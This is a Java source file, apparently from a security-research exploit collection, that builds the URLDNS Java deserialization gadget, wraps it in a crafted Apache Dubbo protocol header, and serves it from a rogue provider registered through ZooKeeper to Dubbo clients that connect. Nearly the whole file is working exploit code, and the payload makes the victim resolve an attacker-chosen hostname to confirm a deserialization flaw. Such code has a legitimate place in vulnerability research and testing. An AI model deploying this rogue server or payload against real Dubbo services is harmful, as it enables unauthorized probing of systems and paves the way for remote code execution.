package com.threedr3am.bug.dubbo.rouge.java;

import com.threedr3am.bug.common.utils.Reflections;
import com.threedr3am.bug.dubbo.rouge.RougeBase;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.util.Random;
import org.apache.dubbo.common.io.Bytes;

public class DNSURL extends RougeBase {

    public static void main(String[] args) throws Exception {
        //Avoid DNS resolution during payload creation
        //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
        URLStreamHandler handler = new SilentURLStreamHandler();

        HashMap ht = new HashMap(); // HashMap that will contain the URL
        URL u = new URL(null, args[0], handler); // URL to use as the Key
        ht.put(u,
            args[0]); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

        Reflections.setFieldValue(u, "hashCode",
            -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.


        ByteArrayOutputStream jserial2ByteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(jserial2ByteArrayOutputStream);
        objectOutputStream.writeByte(1);
        objectOutputStream.writeObject(ht);
        objectOutputStream.flush();
        objectOutputStream.close();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set response event and serialization flag.
        header[2] = (byte) ((byte) 0x20 | 3);
        header[3] = 20;

        // set response id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

        Bytes.int2bytes(jserial2ByteArrayOutputStream.size(), header, 12);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(jserial2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        String zookeeperUri = "127.0.0.1:2181";
        String rougeHost = "127.0.0.1";
        int rougePort = 33336;

        new DNSURL().startRougeServer(zookeeperUri, rougeHost, rougePort, bytes, true);
    }

    @Override
    public String getType() {
        return "java";
    }

    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}
